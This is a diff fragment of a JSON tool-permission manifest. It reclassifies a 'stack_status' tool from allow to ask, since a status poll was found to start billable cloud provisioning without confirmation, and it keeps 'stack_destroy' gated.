+      "why": "RECLASSIFIED allow→ask 2026-08-10 (cross-model QE HIGH, false-safe): handleStackStatus (tools_stack.go:451) calls s.advance() on planned/running jobs (:479-484); advance starts pending steps via s.callTool (:220) — i.e. it INVOKES the paid create tools (provision, pg_create, k8s_create, lb_create, …) with no confirmation. LIVE-REPRODUCED against baseline 59f83fc0: one stack_status call moved a planned job planned→running and attempted provision (stopped only at AUTH_REQUIRED). The fully-allow chain stack_plan→stack_status would provision a billable stack with ZERO prompts. Upstream design smell (engine, licence-blocked — not fixed here): a status poll on a NEVER-APPLIED job should not start spending."
+    },
+    "stack_destroy": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    }
+  }
+}
